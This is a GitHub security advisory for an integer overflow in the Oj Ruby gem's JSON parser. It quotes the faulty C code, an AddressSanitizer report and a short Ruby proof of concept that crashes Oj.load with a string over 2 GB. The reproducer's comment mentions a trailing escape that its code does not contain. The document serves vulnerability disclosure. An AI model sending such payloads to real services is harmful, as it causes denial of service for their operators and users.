# [H] Oj: Integer Overflow in Oj.load 2GB String Handling

## Summary
Severity: High
Advisory: GHSA-475m-ph3x-64gp
CVE: CVE-2026-54903
CWE: CWE-190
Ecosystem: RubyGems
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-475m-ph3x-64gp
Type: github-advisory

## Affected
- RubyGems: `oj` — affected >=0 <3.17.3

## Details
### Summary

`Oj.load` is vulnerable to heap corruption when parsing a JSON string longer than 2 GB. An integer overflow in `buf_append_string` (`buf.h:61`) converts the string length to a large negative `size_t`, causing `memcpy` to copy an astronomically large amount of data out of bounds. This crashes the process and can corrupt adjacent heap memory.

### Version

- **Software**: oj gem
- **Affected**: all versions with `ext/oj/buf.h` and `ext/oj/parse.c`
- **Latest tested**: 3.17.1 (confirmed present)

### Details

`ext/oj/buf.h`, line 61:

```c
inline static void buf_append_string(Buf buf, const char *s, size_t slen) {
    // ...
    memcpy(buf->tail, s, slen);   // slen derived from 32-bit int that wrapped negative
```

In `parse.c`, escape sequence handling computes the remaining string length as an `int`:

```c
// parse.c:402 (read_escaped_str)
int  slen = (int)(s - str);   // ← wraps to negative when string > 2 GB
buf_append_string(buf, str, (size_t)slen);  // ← (size_t)(-2147483648) = 0x80000000...
```

ASAN report:
```
==399019==ERROR: AddressSanitizer: negative-size-param: (size=-2147483648)
    #0 __asan_memcpy
    #1 buf_append_string  /ext/oj/buf.h:61
    #2 read_escaped_str   /ext/oj/parse.c:402
    #3 read_str           /ext/oj/parse.c:542
    #4 oj_parse2          /ext/oj/parse.c:882
    #5 oj_pi_parse        /ext/oj/parse.c:1256
    #6 oj_object_parse    /ext/oj/object.c:701
    #7 load               /ext/oj/oj.c:1259
0x7f5a26ff0801 is located 1 bytes inside of 2147483657-byte region [0x7f5a26ff0800, 0x7f5aa6ff0809)
```

### Reproduce

```ruby
require 'oj'
n = 1 << 31                         # 2 GB
json = '"' + ('A' * n) + 'A"'  # >2GB JSON string with a trailing escape
Oj.load(json)
```

## References
- https://github.com/ohler55/oj/security/advisories/GHSA-475m-ph3x-64gp
- https://github.com/ohler55/oj
